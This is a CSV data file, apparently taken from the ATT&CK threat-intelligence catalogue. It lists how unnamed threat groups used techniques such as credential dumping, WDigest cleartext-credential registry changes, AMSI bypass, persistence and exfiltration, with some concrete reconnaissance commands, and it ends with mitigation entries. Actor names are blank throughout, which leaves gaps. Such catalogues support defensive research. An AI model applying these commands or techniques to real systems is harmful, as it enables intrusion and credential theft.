Query Registry,A  tool can read and decrypt stored Registry values.,relationship
Windows Service,A  tool can create a new service naming it after the config information to gain persistence.,relationship
Network Service Scanning,actors use the Hunter tool to conduct network service discovery for vulnerable systems.,relationship
Web Shell,has used a variety of Web shells.,relationship
Exploitation of Remote Services,has exploited MS17-101 to move laterally to other systems on the network.,relationship
Exploitation for Client Execution,has exploited the Microsoft SharePoint vulnerability CVE-2019-0604.,relationship
Remote Data Staging,has moved staged encrypted archives to Internet-facing servers that had previously been compromised with  prior to exfiltration.,relationship
LSASS Memory,actors have used a modified version of  called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.,relationship
Security Account Manager,actors have used  to dump credentials. They have also dumped credentials from domain controllers.,relationship
Remote Access Software,used a cloud-based remote access software called LogMeIn for their attacks.,relationship
PowerShell,leveraged PowerShell to run commands to download payloads traverse the compromised networks and carry out reconnaissance.,relationship
Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,has used WinSCP to exfiltrate data from a targeted organization over FTP.,relationship
Hidden Files and Directories,has created a hidden directory under C:\ProgramData\Apple\Updates\ and C:\Users\Public\Documents\Flash\.,relationship
Deobfuscate/Decode Files or Information,used shellcode with an XOR algorithm to decrypt a payload.  also decrypted image files which contained a payload.,relationship
Dynamic-link Library Injection,has injected a DLL backdoor into dllhost.exe and svchost.exe.,relationship
Process Discovery,is capable of enumerating the running processes on the system using pslist.,relationship
Winlogon Helper DLL,has created the Registry key HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell and sets the value to establish persistence.,relationship
Exploitation for Client Execution,has executed commands through Microsoft security vulnerabilities including CVE-2017-11882 CVE-2018-0802 and CVE-2012-0158.,relationship
Spearphishing Attachment,sent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments.,relationship
Security Software Discovery,can search for anti-virus software running on the system.,relationship
Obfuscated Files or Information,has encrypted configuration files.,relationship
Asymmetric Cryptography,has used SSL to connect to C2 servers.,relationship
Template Injection,delivered malicious documents with the XLSX extension typically used by OpenXML documents but the file itself was actually an OLE (XLS) document.,relationship
DLL Side-Loading,has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools.,relationship
Network Service Scanning,used pr and an openly available tool to scan for open ports on target systems.,relationship
Network Share Discovery,used netview to scan target systems for shared resources.,relationship
System Owner/User Discovery,used letmein to scan for saved usernames on the target system.,relationship
Windows Service,has installed a service pointing to a malicious DLL dropped to disk.,relationship
Malicious File,has lured victims into executing malware via malicious e-mail attachments.,relationship
Web Protocols,has used HTTP in communication with the C2.,relationship
Registry Run Keys / Startup Folder,has created shortcuts in the Startup folder to establish persistence.,relationship
Steganography,has used JPG files with encrypted payloads to mask their backdoor routines and evade detection.,relationship
Ingress Tool Transfer,has used a delivered trojan to download additional files.,relationship
Replication Through Removable Media,has attempted to transfer  from an infected USB device by copying an Autorun function to the target machine.,relationship
Standard Encoding,has used base64 encoding to hide command strings delivered from the C2.,relationship
Web Shell,has started a web service in the target host and wait for the adversary to connect acting as a web shell.,relationship
Native API,has used multiple Windows APIs including HttpInitialize HttpCreateHttpHandle and HttpAddUrl.,relationship
Encrypted Channel,has encrypted traffic with the C2 to prevent network detection.,relationship
DNS,backdoor has communicated to the C2 over the DNS protocol.,relationship
Software Discovery,backdoor could list the infected system's installed software.,relationship
Match Legitimate Name or Location,has hidden payloads in Flash directories and fake installer files.,relationship
Local Accounts,has used known administrator account credentials to execute the backdoor directly.,relationship
Automated Exfiltration,has used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage.,relationship
Exfiltration over USB,has exfiltrated data using USB storage devices.,relationship
File and Directory Discovery,has monitored files' modified time.,relationship
Automated Collection,has collected information automatically using the adversary's  attack.,relationship
System Information Discovery,has detected a target systems OS version and system volume information.,relationship
System Network Configuration Discovery,has used scripts to collect the host's network topology.,relationship
Windows Command Shell,has used Windows command scripts.,relationship
System Network Connections Discovery,has tested if the localhost network is available and other connection capability on an infected system using command scripts.,relationship
File Deletion,has deleted dropper files on an infected system using command scripts.,relationship
Brute Force,may attempt to connect to systems within a victim's network using net use commands and a predefined list or collection of passwords.,relationship
Spearphishing Link,attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.,relationship
Query Registry,surveys a system upon check-in to discover information in the Windows Registry with the reg query command.  has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .,relationship
PowerShell,has used PowerShell to execute commands/scripts in some cases via a custom executable or code from 's PSInject.  has also used PowerShell scripts to load and execute malware in memory.,relationship
System Service Discovery,surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command.,relationship
File and Directory Discovery,surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory the current user's desktop the Program Files directory and Recent.  RPC backdoors have also searched for files matching the lPH*.dll pattern.,relationship
Registry Run Keys / Startup Folder,A  Javascript backdoor added a local_update_check value under the Registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to establish persistence. Additionally a  custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.,relationship
Bidirectional Communication,A  JavaScript backdoor has used Google Apps Script as its C2 server.,relationship
Process Injection,has also used 's Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system.,relationship
Malicious Link,has used spearphishing via a link to get users to download and run their malware.,relationship
Ingress Tool Transfer,has used shellcode to download Meterpreter after compromising a victim.,relationship
Remote System Discovery,surveys a system upon check-in to discover remote systems on a local network using the net view and net view /DOMAIN commands.  has also used net group Domain Computers /domain net group Domain Controllers /domain and net group Exchange Servers /domain to enumerate domain computers including the organization's DC and Exchange Server.,relationship
System Network Configuration Discovery,surveys a system upon check-in to discover network configuration details using the arp -a nbtstat -n nbtscan net config ipconfig /all and route commands.  RPC backdoors have also retrieved registered RPC interface information from process memory.,relationship
System Information Discovery,surveys a system upon check-in to discover operating system configuration details using the systeminfo gpresult and set commands.,relationship
Winlogon Helper DLL,established persistence by adding a Shell value under the Registry key HKCU\Software\Microsoft\Windows NT\CurrentVersion]Winlogon.,relationship
Web Protocols,has used HTTP and HTTPS for C2 communications.,relationship
Indicator Removal from Tools,Based on comparison of  versions  made an effort to obfuscate strings in the malware that could be used as IoCs including the mutex name and named pipe.,relationship
Process Discovery,surveys a system upon check-in to discover running processes using the tasklist /v command.  RPC backdoors have also enumerated processes associated with specific open ports or named pipes.,relationship
System Network Connections Discovery,surveys a system upon check-in to discover active local network connections using the netstat -an net use net file and net session commands.  RPC backdoors have also enumerated the IPv4 TCP connection table via the GetTcpTable2 API call.,relationship
Spearphishing Attachment,has used spearphishing emails to deliver  as a malicious attachment.,relationship
SMB/Windows Admin Shares,used net use commands to connect to lateral systems within a network.,relationship
System Time Discovery,surveys a system upon check-in to discover the system time by using the net time command.,relationship
PowerShell Profile,has used PowerShell profiles to maintain persistence on an infected machine.,relationship
Modify Registry,has used the Registry to store encrypted payloads.,relationship
Obfuscated Files or Information,has used encryption (including salted 3DES via 's Out-EncryptedScript.ps1) random variable names and base64 encoding to obfuscate PowerShell commands and payloads.,relationship
Windows Management Instrumentation Event Subscription,has used WMI event filters and consumers to establish persistence.,relationship
Native API,and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.,relationship
Disable or Modify Tools,has used a AMSI bypass which patches the in-memory amsi.dll in PowerShell scripts to bypass Windows antimalware products.,relationship
Deobfuscate/Decode Files or Information,has used a custom decryption routine which pulls key and salt values from other artifacts such as a WMI filter or  to decode encrypted PowerShell payloads.,relationship
Proxy,RPC backdoors have included local UPnP RPC proxies.,relationship
Data from Removable Media,RPC backdoors can collect files from USB thumb drives.,relationship
Create Process with Token,RPC backdoors can impersonate or steal process tokens before executing commands.,relationship
Data from Local System,RPC backdoors can upload files from victim machines.,relationship
Windows Command Shell,RPC backdoors have used cmd.exe to execute commands.,relationship
Credentials from Password Stores,has gathered credentials from the Windows Credential Manager tool.,relationship
Visual Basic,has used VBS scripts throughout its operations.,relationship
Exfiltration to Cloud Storage,has used WebDAV to upload stolen USB files to a cloud drive.  has also exfiltrated stolen files to OneDrive and 4shared.,relationship
Archive via Utility,has encrypted files stolen from connected USB drives into a RAR file before exfiltration.,relationship
Dynamic-link Library Injection,has used Metasploit to perform reflective DLL injection in order to escalate privileges.,relationship
Lateral Tool Transfer,RPC backdoors can be used to transfer files to/from victim machines on the local network.,relationship
Domain Groups,has used net group Domain Admins /domain to identify domain administrators.,relationship
Local Groups,has used net localgroup and net localgroup Administrators to enumerate group information including members of the local administrators group.,relationship
Domain Account,has used net user /domain to enumerate domain accounts.,relationship
Local Account,has used net user to enumerate local accounts on the system.,relationship
Password Policy Discovery,has used net accounts and net accounts /domain to acquire password policy information.,relationship
Peripheral Device Discovery,has used fsutil fsinfo drives to list connected drives.,relationship
Data from Information Repositories,has used a custom .NET tool to collect documents from an organization's internal central database.,relationship
Drive-by Compromise,has infected victims using watering holes.,relationship
Security Software Discovery,has obtained information on security software including security logging information that may indicate whether their malware has been detected.,relationship
Malware,has used malware obtained after compromising other threat actors such as .,relationship
Virtual Private Server,has used the VPS infrastructure of compromised Iranian threat actors.,relationship
Web Services,has frequently used compromised WordPress sites for C2 infrastructure.,relationship
Server,has used compromised servers as infrastructure.,relationship
Malware,has developed its own unique malware for use in operations.,relationship
Web Protocols,has used HTTP for network communication.,relationship
Visual Basic,has used VBS scripts throughout its operation.,relationship
PowerShell,has used PowerShell for script execution.,relationship
Ingress Tool Transfer,has downloaded PowerShell code from the C2 server to be executed.,relationship
Regsvr32,has used Regsvr32.exe to trigger the execution of a malicious script.,relationship
Deobfuscate/Decode Files or Information,has decoded a base64 encoded document which was embedded in a VBS script.,relationship
Command and Scripting Interpreter,has used a simple remote shell tool that will call back to the C2 server and wait for commands.,relationship
Exploitation for Privilege Escalation,has used an open-source tool to exploit a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers.,relationship
Malicious File,has used malicious .exe or .dll files disguised as documents or images.,relationship
Ingress Tool Transfer,has the ability to download additional tools from the C2.,relationship
Obfuscated Files or Information,has encrypted the payload used for C2.,relationship
Match Legitimate Name or Location,has named the malicious DLL the same name as DLLs belonging to legitimate software from various security vendors.,relationship
DLL Search Order Hijacking,has used search order hijacking to run the loader Vcrodat.,relationship
LSASS Memory,has used  to obtain credentials.,relationship
Malicious File,has used e-mail attachments to lure victims into executing malicious code.,relationship
Malicious Link,has used links embedded in e-mails to lure victims into executing malicious code.,relationship
Invalid Code Signature,has used revoked certificates to sign malware.,relationship
Spearphishing Link,has sent spearphishing emails with links to harvest credentials and deliver malware.,relationship
Masquerading,has used icons mimicking MS Office files to mask malicious executables.,relationship
Spearphishing Attachment,has sent spearphishing emails with attachment to harvest credentials and deliver malware.,relationship
Drive-by Compromise,has used compromised websites to register custom URL schemes on a remote system.,relationship
Spearphishing via Service,has used fake personas on social media to engage and target victims.,relationship
Rootkit,used a rootkit to modify typical server functionality.,relationship
Code Signing,used stolen certificates to sign its malware.,relationship
Process Discovery,looked for a specific process running on infected servers.,relationship
Spearphishing Attachment,has used spearphishing attachments to deliver Microsoft documents containing macros or PDFs containing malicious links to download either  Bokbot  or Bazar.,relationship
Modify Registry,has modified the Registry key HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest by setting the UseLogonCredential registry value to 1 in order to force credentials to be stored in clear text in memory.,relationship
Malicious File,has lured victims to execute malware with spearphishing attachments containing macros to download either  Bokbot or .,relationship
Masquerade Task or Service,has used scheduled tasks to install  using task names to appear legitimate such as WinDotNet GoogleTask or Sysnetsf. It has also used common document file names for other malware binaries.,relationship
Scheduled Task,has used scheduled tasks establish persistence for  and other malware.,relationship
PowerShell,has used macros to execute PowerShell scripts to download malware on victim's machines. It has also used PowerShell to execute commands and move laterally through a victim network.,relationship
File Deletion,has used file deletion to remove some modules and configurations from an infected host after use.,relationship
Windows Service,has installed  as a service named ControlServiceA in order to establish persistence.,relationship
Lateral Tool Transfer,has used stolen credentials to copy tools into the %TEMP% directory of domain controllers.,relationship
Remote Desktop Protocol,has used RDP for lateral movement.,relationship
Exfiltration Over C2 Channel,has exfiltrated domain credentials and network enumeration information over command and control (C2) channels.,relationship
Web Protocols,has used HTTP for network communications.,relationship
Data Staged,has collected and staged credentials and network enumeration information using the networkdll and psfin  modules.,relationship
Obfuscated Files or Information,used Base64 encoding to obfuscate an  service and PowerShell commands.,relationship
Remote System Discovery,has used networkdll for network discovery and psfin specifically for financial and point of sale indicators.  has also used AdFind.exe and nltest/dclist to enumerate domain computers including the domain controller.,relationship
Valid Accounts,has used valid credentials for privileged accounts with the goal of accessing domain controllers. ,relationship
Windows Management Instrumentation,has used WMI and LDAP queries for network discovery and to move laterally.,relationship
Domain Groups,has used AdFind.exe to collect information about Active Directory groups and accounts.,relationship
Domain Trust Discovery,has used AdFind.exe to collect information about Active Directory organizational units and trust objects.,relationship
Dynamic-link Library Injection,has injected malicious DLLs into memory with read write and execute permissions.,relationship
NTDS,has gained access to credentials via exported copies of the ntds.dit Active Directory database.,relationship
Malicious Link,has lured victims into clicking a malicious link delivered through spearphishing.,relationship
Spearphishing Link,has sent phishing emails containing a link to an actor-controlled Google Drive document or other free online file hosting services.,relationship
Kerberoasting,has used Rubeus MimiKatz Kerberos module and the Invoke-Kerberoast cmdlet to steal AES hashes.,relationship
Windows Remote Management,has used Window Remote Management to move laterally through a victim network.,relationship
Network Share Discovery,has used the net view command to locate mapped network shares.,relationship
Disable or Modify Tools,has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing.,relationship
Registry Run Keys / Startup Folder,has has established persistence via the Registry key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and a shortcut within the startup folder.,relationship
System Owner/User Discovery,has used whoami to identify the local user and their privileges.,relationship
Domain Accounts,has used administrative accounts including Domain Admin to move laterally within a victim network.,relationship
External Remote Services,has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure.,relationship
Service Stop,has used taskkill.exe and net.exe to stop backup catalog cloud and other services prior to network encryption.,relationship
Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,has exfiltrated victim information using FTP.,relationship
Windows Command Shell,has used cmd.exe to execute commands on a victim's machine.,relationship
System Information Discovery,has used systeminfo and similar commands to acquire detailed configuration information of a victim machine.,relationship
SMB/Windows Admin Shares,has used SMB to drop Cobalt Strike Beacon on a domain controller for lateral movement.,relationship
Service Execution,has used services.exe to execute scripts and executables during lateral movement within a victim network.,relationship
LLMNR/NBT-NS Poisoning and SMB Relay,has used the Invoke-Inveigh PowerShell cmdlets likely for name service poisoning.,relationship
Exploitation of Remote Services,has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities.,relationship
Security Software Discovery,has used WMI to identify anti-virus products installed on a victim's machine.,relationship
Winlogon Helper DLL,has established persistence using Userinit by adding the Registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.,relationship
Security Account Manager,has acquired credentials from the SAM/SECURITY registry hives.,relationship
Code Signing,has used Digicert code-signing certificates for some of its malware.,relationship
Code Signing Certificates,obtained a code signing certificate signed by Digicert for some of its malware.,relationship
Windows File and Directory Permissions Modification,has used the icacls command to modify access control to backup servers providing them with full control of all the system folders.,relationship
System Network Configuration Discovery,has used ipconfig to identify the network configuration of a victim machine.,relationship
Domain Account,has identified domain admins through the use of net group Domain admins commands.,relationship
Local Account,actors used the following commands following exploitation of a machine with  malware to enumerate user accounts: net user >> %temp%\download net user /domain >> %temp%\download,relationship
Local Groups,actors used the following command following exploitation of a machine with  malware to list local groups: net localgroup administrator >> %temp%\download,relationship
Windows Command Shell,Following exploitation with  malware  actors created a file containing a list of commands to be executed on the compromised computer.,relationship
System Information Discovery,actors used the following commands after exploiting a machine with  malware to obtain information about the OS: ver >> %temp%\download systeminfo >> %temp%\download,relationship
Match Legitimate Name or Location,actors used the following command to rename one of their tools to a benign file name: ren %temp%\upload audiodg.exe,relationship
File and Directory Discovery,actors used the following commands after exploiting a machine with  malware to obtain information about files and directories: dir c:\ >> %temp%\download dir c:\Documents and Settings >> %temp%\download dir c:\Program Files\ >> %temp%\download dir d:\ >> %temp%\download,relationship
System Network Configuration Discovery,actors used the following command after exploiting a machine with  malware to acquire information about local networks: ipconfig /all >> %temp%\download,relationship
System Network Connections Discovery,actors used the following command following exploitation of a machine with  malware to display network connections: netstat -ano >> %temp%\download,relationship
System Service Discovery,actors used the following command following exploitation of a machine with  malware to obtain information about services: net start >> %temp%\download,relationship
Exploitation for Client Execution,has exploited client software vulnerabilities for execution such as Microsoft Word CVE-2012-0158.,relationship
Malicious File,has attempted to get victims to launch malicious Microsoft Word attachments delivered via spearphishing emails.,relationship
Spearphishing Attachment,has sent emails with malicious Microsoft Office documents attached.,relationship
Windows Management Instrumentation,uses a modified version of pentesting script wmiexec.vbs which logs into a remote machine using WMI.,relationship
Security Account Manager,has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.,relationship
Valid Accounts,has used valid accounts shared between Managed Service Providers and clients to move between the two environments.,relationship
System Network Configuration Discovery,has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.,relationship
Data from Network Shared Drive,has collected data from remote systems by mounting network shares with net use and using Robocopy to transfer data.,relationship
Domain Account,has used the Microsoft administration tool csvde.exe to export Active Directory data.,relationship
Obfuscated Files or Information,has encoded strings in its malware with base64 as well as with a simple single-byte XOR obfuscation using key 0x40.,relationship
System Network Connections Discovery,has used net use to conduct connectivity checks to machines.,relationship
Malicious File,has attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents sent via email as part of spearphishing campaigns.,relationship
External Proxy,has used a global service provider's IP as a proxy for C2 traffic from a victim.,relationship
Scheduled Task,has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.,relationship
Trusted Relationship,has used legitimate access granted to Managed Service Providers in order to access victims of interest.,relationship
Windows Command Shell,executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands.  has used malicious macros embedded inside Office documents to execute files.,relationship
DLL Search Order Hijacking,has used DLL search order hijacking.,relationship
Process Hollowing,has used process hollowing in iexplore.exe to load the  implant.,relationship
Deobfuscate/Decode Files or Information,has used  in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used certutil -decode to decode files on the victims machine when dropping .,relationship
Spearphishing Attachment,has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.,relationship
Local Data Staging,stages data prior to exfiltration in multi-part archives often saved in the Recycle Bin.,relationship
Remote Desktop Protocol,has used RDP connections to move across the victim network.,relationship
DLL Side-Loading,has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as .,relationship
Remote System Discovery,uses scripts to enumerate IP ranges on the victim network.  has also issued the command net view /domain to a  implant to gather information about remote systems on the network.,relationship
File Deletion,A  macro deletes files after it has decoded and decompressed them.,relationship
Ingress Tool Transfer,has installed updates and new malware on victims.,relationship
SSH,has used Putty Secure Copy Client (PSCP) to transfer data.,relationship
PowerShell,uses  to inject shellcode into PowerShell.,relationship
Archive via Utility,has compressed files before exfiltration using TAR and RAR.,relationship
Network Service Scanning,has used tcping.exe similar to  to probe port status on systems of interest.,relationship
Match Legitimate Name or Location,has been seen changing malicious files to appear legitimate.,relationship
Archive Collected Data,has encrypted files and information before exfiltration.,relationship
Data from Local System,has collected various files from the compromised computers.,relationship
Keylogging,has used key loggers to steal usernames and passwords.,relationship
Remote Data Staging,has staged data on remote MSP systems or other victim networks prior to exfiltration.,relationship
Masquerading,has used  to change file extensions to their true type that were masquerading as .txt files. ,relationship
Rename System Utilities,has renamed  and moved it to a different location on the system to avoid detection based on use of the tool.,relationship
LSA Secrets,has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.,relationship
InstallUtil,has used InstallUtil.exe to execute malicious software.,relationship
Compromise Software Supply Chain,gained initial network access via a trojanized update of SolarWinds Orion software.,relationship
Account Discovery,obtained a list of users and their roles from an Exchange server using Get-ManagementRoleAssignment.,relationship
PowerShell,used PowerShell to create new tasks on remote machines identify configuration settings exfiltrate data and to execute other commands.,relationship
Exploit Public-Facing Application,exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.,relationship
Archive via Utility,used 7-Zip to compress stolen emails into password-protected archives prior to exfiltration.,relationship
Masquerade Task or Service,named tasks \Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager in order to appear legitimate.,relationship
Remote Email Collection,collected emails from specific individuals such as executives and IT staff using New-MailboxExportRequest followed by Get-MailboxExportRequest.,relationship
Scheduled Task,used scheduler and schtasks to create new tasks on remote hosts as part of lateral movement. They also manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.  also created a scheduled task to maintain  persistence when the host booted. ,relationship
Indicator Removal on Host,removed evidence of email export requests using Remove-MailboxExportRequest. They temporarily replaced legitimate utilities with their own executed their payload and then restored the original file.,relationship
Windows Command Shell,used cmd.exe to execute commands on remote machines.,relationship
File Deletion,routinely removed their tools including custom backdoors once remote access was achieved.,relationship
Match Legitimate Name or Location,renamed a version of  to sqlceip.exe or csrss.exe in an attempt to appear as the SQL Server Telemetry Client or Client Service Runtime Process respectively.,relationship
File and Directory Discovery,obtained information about the configured Exchange virtual directory using Get-WebServicesVirtualDirectory.,relationship
Dynamic Resolution,used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2.,relationship
Exchange Email Delegate Permissions,added their own devices as allowed IDs for active sync using Set-CASMailbox allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.,relationship
Ingress Tool Transfer,downloaded additional tools such as  malware and  to the compromised host following initial compromise.,relationship
Remote Data Staging,staged data and files in password-protected archives on a victim's OWA server.,relationship
Web Cookies,bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key.,relationship
Malware,developed    and ;  and  were tailored to be incorporated into SolarWind's Orion software library.,relationship
Code Signing,was able to get  signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.,relationship
Data from Local System,extracted files from compromised networks. ,relationship
Web Protocols,used HTTP for C2 and data exfiltration.,relationship
Valid Accounts,used different compromised credentials for remote access and to move laterally.,relationship
Obfuscated Files or Information,used encoded PowerShell commands.,relationship
Rundll32,used Rundll32 to execute payloads.,relationship
Additional Cloud Credentials,added credentials to OAuth Applications and Service Principals. ,relationship
Permission Groups Discovery,used the Get-ManagementRoleAssignment PowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell.,relationship
Domain Trust Discovery,used the Get-AcceptedDomain PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell. They also used  to enumerate domains and to discover trust between federated domains.,relationship
SAML Tokens,created tokens using compromised SAML signing certificates.,relationship
Process Discovery,used multiple command-line utilities to enumerate running processes.,relationship
Masquerading,set the hostnames of its C2 infrastructure to match legitimate hostnames in the victim environment. They also primarily used IP addresses originating from the same country as the victim for their VPN infrastructure.,relationship
Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers.,relationship
DCSync,leveraged privileged accounts to replicate directory service data with domain controllers.,relationship
Windows Management Instrumentation Event Subscription,used WMI event subscriptions for persistence.,relationship
Windows Management Instrumentation,used WMI for the remote execution of files for lateral movement.,relationship
Use Alternate Authentication Material,used forged SAML tokens that allowed the actors to impersonate users and bypass MFA enabling  to access enterprise cloud applications and services.,relationship
Web Session Cookie,used a forged duo-sid cookie to bypass MFA set on an email account.,relationship
Domain Trust Modification,changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.,relationship
Private Keys,obtained the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates.,relationship
Internal Proxy,configured at least one instance of  to use a network pipe over SMB during the 2020 SolarWinds intrusion.,relationship
Deobfuscate/Decode Files or Information,used 7-Zip to decode its  malware.,relationship
Windows Remote Management,has used WinRM via PowerShell to execute command and payloads on remote hosts.,relationship
System Information Discovery,used fsutil to check available free space before executing actions that might create large files on disk.,relationship
Disable or Modify System Firewall,used netsh to configure firewall rules that limited certain UDP outbound packets.,relationship
Disable Windows Event Logging,used AUDITPOL to prevent the collection of audit logs.,relationship
Disable or Modify Tools,used the service control manager on a remote system to disable services associated with security monitoring products.,relationship
Remote System Discovery,used  to enumerate remote systems.,relationship
Kerberoasting,obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.,relationship
Credentials from Password Stores,used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords.,relationship
Timestomp,modified timestamps of backdoors to match legitimate Windows files.,relationship
.bash_profile and .bashrc Mitigation,Making these files immutable and only changeable by certain administrators will limit the ability for adversaries to easily create user level persistence.,course_of_action
Access Token Manipulation Mitigation,"Access tokens are an integral part of the security system within Windows and cannot be turned off. However, an attacker must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require to do their job.

Any user can also spoof access tokens if they have legitimate credentials. Follow mitigation guidelines for preventing adversary use of . Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create a token object. (Citation: Microsoft Create Token) Also define who can create a process level token to only the local and network service through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace a process level token. (Citation: Microsoft Replace Process Token)

Also limit opportunities for adversaries to increase privileges by limiting Privilege Escalation opportunities.",course_of_action
Accessibility Features Mitigation,"To use this technique remotely, an adversary must use it in conjunction with RDP. Ensure that Network Level Authentication is enabled to force the remote desktop session to authenticate before the session is created and the login screen displayed. It is enabled by default on Windows Vista and later. (Citation: TechNet RDP NLA)

If possible, use a Remote Desktop Gateway to manage connections and security configuration of RDP within a network. (Citation: TechNet RDP Gateway)

Identify and block potentially malicious software that may be executed by an adversary with this technique by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Account Discovery Mitigation,"Prevent administrator accounts from being enumerated when an application is elevating through UAC since it can lead to the disclosure of account names. The Registry key is located <code>HKLM\ SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\CredUI\EnumerateAdministrators</code>. It can be disabled through GPO: Computer Configuration > [Policies] > Administrative Templates > Windows Components > Credential User Interface: E numerate administrator accounts on elevation. (Citation: UCF STIG Elevation Account Enumeration)

Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Account Use Policies,"Configure features related to account use like login attempt lockouts, specific login times, etc.",course_of_action
Active Directory Configuration,"Configure Active Directory to prevent use of certain techniques; use SID Filtering, etc.",course_of_action
Antivirus/Antimalware,Use signatures or heuristics to detect malicious software.,course_of_action
AppCert DLLs Mitigation,"Identify and block potentially malicious software that may be executed through AppCert DLLs by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) that are capable of auditing and/or blocking unknown DLLs.",course_of_action
AppInit DLLs Mitigation,"Upgrade to Windows 8 or later and enable secure boot.

Identify and block potentially malicious software that may be executed through AppInit DLLs by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) that are capable of auditing and/or blocking unknown DLLs.",course_of_action
AppleScript Mitigation,Require that all AppleScript be signed by a trusted developer ID before being executed - this will prevent random AppleScript code from executing  (Citation: applescript signing). This subjects AppleScript code to the same scrutiny as other .app files passing through Gatekeeper.,course_of_action
Application Deployment Software Mitigation,"Grant access to application deployment systems only to a limited number of authorized administrators. Ensure proper system and access isolation for critical network systems through use of firewalls, account privilege separation, group policy, and multifactor authentication. Verify that account credentials that may be used to access deployment systems are unique and not used throughout the enterprise network. Patch deployment systems regularly to prevent potential remote access through . 

If the application deployment system can be configured to deploy only signed binaries, then ensure that the trusted signing certificates are not co-located with the application deployment system and are instead located on a system that cannot be accessed remotely or to which remote access is tightly controlled.",course_of_action
Application Developer Guidance,This mitigation describes any guidance or training given to developers of applications to avoid introducing security weaknesses that an adversary may be able to take advantage of.,course_of_action
Application Isolation and Sandboxing,Restrict execution of code to a virtual environment on or in transit to an endpoint system.,course_of_action
Application Shimming Mitigation,"There currently aren't a lot of ways to mitigate application shimming. Disabling the Shim Engine isn't recommended because Windows depends on shimming for interoperability and software may become unstable or not work. Microsoft released an optional patch update - KB3045645 - that will remove the ""auto-elevate"" flag within the sdbinst.exe. This will prevent use of application shimming to bypass UAC. 

Changing UAC settings to ""Always Notify"" will give the user more visibility when UAC elevation is requested, however, this option will not be popular among users due to the constant UAC interruptions.",course_of_action
Application Window Discovery Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to acquire information, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Audio Capture Mitigation,"Mitigating this technique specifically may be difficult as it requires fine-grained API control. Efforts should be focused on preventing unwanted or unknown code from executing on a system.

